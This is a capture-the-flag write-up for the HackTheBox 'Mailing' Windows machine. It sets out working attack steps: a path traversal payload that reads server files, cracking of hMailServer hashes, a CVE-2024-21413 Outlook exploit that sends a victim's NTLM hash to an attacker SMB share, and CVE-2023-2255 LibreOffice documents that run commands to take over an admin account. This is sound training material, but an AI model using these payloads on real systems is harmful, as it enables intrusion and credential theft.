---
layout: post
title: Mailing - Easy - Windows
date: 04-05-2024
categories: [CTF - HackTheBox]
tag: [File Disclosure, hMailServer, MSSQLCE, Microsoft Outlook, CVE-2024-21413, LibreOffice, NTLM, Responder]
---

# Nmap Scan

```
# Nmap 7.94SVN scan initiated Wed May  8 20:28:55 2024 as: nmap -sCV -p- -oN portscan.log -v 10.10.11.14
Nmap scan report for 10.10.11.14
Host is up (0.028s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://mailing.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 completed CAPABILITY IMAP4rev1 NAMESPACE CHILDREN OK QUOTA RIGHTS=texkA0001 IDLE SORT ACL
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
|_SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
|_imap-capabilities: IMAP4 completed CAPABILITY IMAP4rev1 NAMESPACE CHILDREN OK QUOTA RIGHTS=texkA0001 IDLE SORT ACL
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-08T19:33:22
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May  8 20:34:01 2024 -- 1 IP address (1 host up) scanned in 305.55 seconds
```

# Inspecting Port 80

The webpage reveals the server is hosting hMailServer. There is also a button to download a PDF. The PDF provides setup instructions for the mail client. Two users are also mentioned in the document. `user@mailing.htb` and `maya@mailing.htb`. 

![3af8a45dba57df19e7a8f0d325b21a32.png](/assets/img/3af8a45dba57df19e7a8f0d325b21a32.png)

# File Disclosure

The function to download the PDF was vulnerable and granted file disclosure. Below is an example of reading the hosts file.

```
http://mailing.htb/download.php?file=..\..\windows\system32\drivers\etc\hosts
```

```
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost

127.0.0.1	mailing.htb
```

# hMailServer Settings (hMailServer.INI)

To better understand hMailServer I installed it on a virtual machine. Below is the file structure of a fresh install. The settings of the application are stored in an INI file as seen below. It was possible to use the file disclosure Vulnerability to read this file and expose the password hashes.

![968f2925bcdddf4ae2f15a1e7711f36c.png](/assets/img/968f2925bcdddf4ae2f15a1e7711f36c.png)

## hMailServer.INI via File Disclosure

```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

# hMailServer Database

Using the local installation I discovered the database is stored in the following directory. The file disclosure was used to download the database as well.

![98788fc6b0fdf3ec34b5f5fa6128bc21.png](/assets/img/98788fc6b0fdf3ec34b5f5fa6128bc21.png)

# Cracking Hashes

The administrator hash was simple to crack as its MD5. The MSSQLCE hash appears to be MD5 but its not. After researching hMailServer I discovered the application will generate a random blowfish hash on first install. The hash had custom properties and I could not figure out how to crack it with hashcat. Thankfully there was existing projects on GitHub to reverse the hashing algorithm.

## Administrator Hash (MD5)
```
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

## MSSQLCE (Blowfish Custom)
```
0a9f8ad8bf896b501dde74f08efd7e4c:???
```

## hMailDatabase Password Decrypt

LINK: https://github.com/GitMirar/hMailDatabasePasswordDecrypter

```
┌─[parrot@parrot]─[~/hackthebox/mailing/hMailDatabasePasswordDecrypter]
└──╼ $./decrypt 0a9f8ad8bf896b501dde74f08efd7e4c
6FC6F69152AD
```

# Reading MSSQLCE database (CompactView)

Database credentials have been obtained. CompactView was the application used to read the database as seen below.

![5c6e6a6cbf8e17dfcf64e09580743925.png](/assets/img/5c6e6a6cbf8e17dfcf64e09580743925.png)

## Entering Password

![83b125dad3473e8d2da4551d73ac77e5.png](/assets/img/83b125dad3473e8d2da4551d73ac77e5.png)

## Database Tables

![2ee45a7177293d5d4c6df9fb75c5d6fa.png](/assets/img/2ee45a7177293d5d4c6df9fb75c5d6fa.png)

## Accounts Table

![56b1bc9b65de9ce5c0c53cbfcf23d0b0.png](/assets/img/56b1bc9b65de9ce5c0c53cbfcf23d0b0.png)

# Cracking MSSQLCE Hashes

Unfortunately only two of the 4 hashes cracked. These passwords were already known so nothing of value was obtained by reading the database. A new approach is needed.

Hash Type: 1421 | hMailServer | FTP, HTTP, SMTP, LDAP Server

```
255d222722e7a3aee50fec204cde83ef7f4c74abb7b0e64e28d80e19acbf0cdfcee4b8:homenetworkingadministrator
6838108550817f67b81d99ff4453b78a651b293f3bb8954e8e805f2af4ef00b0d6c4f2:password
```

# CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC

URL: https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

It was possible to login to both `administrator@mailing.htb` and `user@mailing.htb` via SMTP. No emails in either account. However it was possible to send emails. This was the hint towards the above exploit Basically sending an email which will try load resources from an SMB share which will then leak the NTLM hash of the user who reads it. 

## Sending Payload

```
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\\\10.10.14.23\exploit\sample.wav' --subject test
```

## Response via Responder

```
maya::MAILING:c8ec32d1ad64ce29:31D743C7851DB7922EA5A6925524ED5C:01010000000000008097115293A1DA01A87857DA2A1D493F0000000002000800450033004A00570001001E00570049004E002D004800360052004500350042004100350053005800580004003400570049004E002D00480036005200450035004200410035005300580058002E00450033004A0057002E004C004F00430041004C0003001400450033004A0057002E004C004F00430041004C0005001400450033004A0057002E004C004F00430041004C00070008008097115293A1DA0106000400020000000800300030000000000000000000000000200000EB8CB46768E5D386B1BE6AF4FC56929F1E9E45A7F77A1DE26365D7811295E7F50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
```

# Cracking NTLM Hash

```
MAYA::MAILING:c8ec32d1ad64ce29:31d743c7851db7922ea5a6925524ed5c:01010000000000008097115293a1da01a87857da2a1d493f0000000002000800450033004a00570001001e00570049004e002d004800360052004500350042004100350053005800580004003400570049004e002d00480036005200450035004200410035005300580058002e00450033004a0057002e004c004f00430041004c0003001400450033004a0057002e004c004f00430041004c0005001400450033004a0057002e004c004f00430041004c00070008008097115293a1da0106000400020000000800300030000000000000000000000000200000eb8cb46768e5d386b1be6af4fc56929f1e9e45a7f77a1de26365d7811295e7f50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000:m4y4ngs4ri
```

# Logging in as Maya (WINRM)

User access granted.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/mailing]
└──╼ $evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\maya\Documents> cat C:\Users\maya\desktop\user.txt
51c41dde1c109b8ff732c4d354c06a41
*Evil-WinRM* PS C:\Users\maya\Documents> 
```

# Enumerating File System

The root directory contains a folder called `Important Documents` which is not default and stands out. The directory is empty but seems relevant to solving the box.

## Root - Important Documents (EMPTY)
```
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/10/2024   5:32 PM                Important Documents
d-----         2/28/2024   8:49 PM                inetpub
d-----         12/7/2019  10:14 AM                PerfLogs
d-----          3/9/2024   1:47 PM                PHP
d-r---         3/13/2024   4:49 PM                Program Files
d-r---         3/14/2024   3:24 PM                Program Files (x86)
d-r---          3/3/2024   4:19 PM                Users
d-----         4/29/2024   6:58 PM                Windows
d-----         4/12/2024   5:54 AM                wwwroot
```

## Program Files - LibreOffice

LibreOffice is installed which is not default and stands out. Git is also interesting.

```
*Evil-WinRM* PS C:\program files> ls


    Directory: C:\program files


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
d-----         2/27/2024   4:58 PM                Reference Assemblies
d-----         3/13/2024   4:48 PM                RUXIM
d-----         2/27/2024   4:32 PM                VMware
d-----          3/3/2024   5:13 PM                Windows Defender
d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
d-----          3/3/2024   5:13 PM                Windows Mail
d-----          3/3/2024   5:13 PM                Windows Media Player
d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
d-----         2/27/2024   4:26 PM                Windows NT
d-----          3/3/2024   5:13 PM                Windows Photo Viewer
d-----         4/29/2024   6:54 PM                Windows Portable Devices
d-----         12/7/2019  10:31 AM                Windows Security
d-----         3/13/2024   4:49 PM                WindowsPowerShell
```

# LibreOffice 7.4 Installation

Reading a text file in the installation directory uncovered the version.

```
*Evil-WinRM* PS C:\program files\libreoffice\readmes> cat readme_en-GB.txt
```

```
We hope you enjoy working with the new LibreOffice 7.4 and will join us online.
```

# LibreOffice - CVE-2023-2255

This exploit depends on a user opening the malicious document which is a limitation. The `Important Documents` folder is probably there to simulate this logic which makes this exploit relevant. Looks like its possible to run commands as the user who opens the document after checking the POC.

```
Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used "floating frames" linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the treatment of other linked content in LibreOffice. This issue affects: The Document Foundation LibreOffice 7.4 versions prior to 7.4.7; 7.5 versions prior to 7.5.3.
```

POC LINK: https://github.com/elweth-sec/CVE-2023-2255

# Local Users

I forgot to include the first try in the writeup which was a nc.exe reverse shell. The box has defender active which stops that from working. To overcome this I decided to use native commands which will not trigger defender.

Checking the users to locate an admin account with the intention of changing their password.

```
*Evil-WinRM* PS C:\> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrador            DefaultAccount           Invitado
localadmin               maya                     WDAGUtilityAccount
The command completed with one or more errors.
```

# Creating Payload

This should change the password of localadmin.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/mailing/CVE-2023-2255]
└──╼ $python3 CVE-2023-2255.py --cmd 'net user localadmin PasswordChange01' --output payload.odt
```

# Uploading Payload 

Upload successful.

```
*Evil-WinRM* PS C:\important documents> upload ../payload.odt 
                                        
Info: Uploading /home/parrot/hackthebox/mailing/../payload.odt to C:\important documents\payload.odt
                                        
Error: Upload failed. Check filenames or paths: No such file or directory - No such file or directory /home/parrot/hackthebox/payload.odt
*Evil-WinRM* PS C:\important documents> upload payload.odt
                                        
Info: Uploading /home/parrot/hackthebox/mailing/payload.odt to C:\important documents\payload.odt
                                        
Data: 40692 bytes of 40692 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\important documents> ls


    Directory: C:\important documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/9/2024   9:29 AM          30520 payload.odt
```

# Attempt 1 - Failed

`localadmin` is not part of the remote user groups. Unable to remote in via WINRM after changing password.

```
*Evil-WinRM* PS C:\important documents> net user localadmin
User name                    localadmin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-02-27 9:38:46 PM
Password expires             Never
Password changeable          2024-02-27 9:38:46 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-05-09 9:31:16 AM

Logon hours allowed          All

Local Group Memberships      *Administradores
Global Group memberships     *Ninguno
The command completed successfully.
```

# Attempt 2 

It may be possible to add the localadmin user to the remote users group. However it would be much easier and quicker to add Maya to the admin group.

## Add Maya to Administrators

```
┌─[parrot@parrot]─[~/hackthebox/mailing/CVE-2023-2255]
└──╼ $python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output payload.odt
```

## Upload Payload

```
*Evil-WinRM* PS C:\important documents> upload payload2.odt
                                        
Info: Uploading /home/parrot/hackthebox/mailing/payload2.odt to C:\important documents\payload2.odt
                                        
Data: 40700 bytes of 40700 bytes copied
                                        
Info: Upload successful!
```

## Checking Permissions (SUCCESS)

Maya is now an admin.

```
*Evil-WinRM* PS C:\important documents> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-05-09 9:39:46 AM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```

# Relogging as Maya (Admin Access)

It worked. Logged in as Maya with new admin permissions.

```
┌─[✗]─[parrot@parrot]─[~/hackthebox/mailing/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-main]
└──╼ $evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
```

Root Flag captured.

```
*Evil-WinRM* PS C:\users\localadmin\desktop> ls


    Directory: C:\users\localadmin\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/27/2024   4:30 PM           2350 Microsoft Edge.lnk
-ar---          5/9/2024   8:48 AM             34 root.txt


*Evil-WinRM* PS C:\users\localadmin\desktop> type root.txt
e6dbbd706eb5d5d84ef4bff4e790177e

```